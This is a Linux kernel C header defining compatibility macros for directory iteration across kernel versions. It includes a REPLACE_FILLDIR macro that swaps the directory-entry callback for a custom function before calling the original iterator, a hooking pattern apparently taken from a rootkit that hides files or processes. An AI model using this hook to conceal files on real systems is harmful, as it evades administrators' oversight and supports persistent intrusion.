#ifndef _ITERATE_H
#define _ITERATE_H

#include <linux/proc_fs.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
#define ITERATE_NAME  readdir
#define ITERATE_PROTO struct file *file, void *dirent, filldir_t filldir
#define FILLDIR_VAR   filldir
#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC)                     \
        {                                                               \
                ret = ITERATE_FUNC(file, dirent, &FILLDIR_FUNC);        \
        }
#else

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 6, 7)
#define ITERATE_NAME  iterate
#else
#define ITERATE_NAME  iterate_shared
#endif /* KERNEL_VERSION(4, 6, 7) */

#define ITERATE_PROTO struct file *file, struct dir_context *ctx
#define FILLDIR_VAR   ctx->actor
#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC)             \
        {                                                       \
                *((filldir_t *)&ctx->actor) = &FILLDIR_FUNC;    \
                ret = ITERATE_FUNC(file, ctx);                  \
        }
#endif /* KERNEL_VERSION(3, 11, 0) */

#endif /* _ITERATE_H */

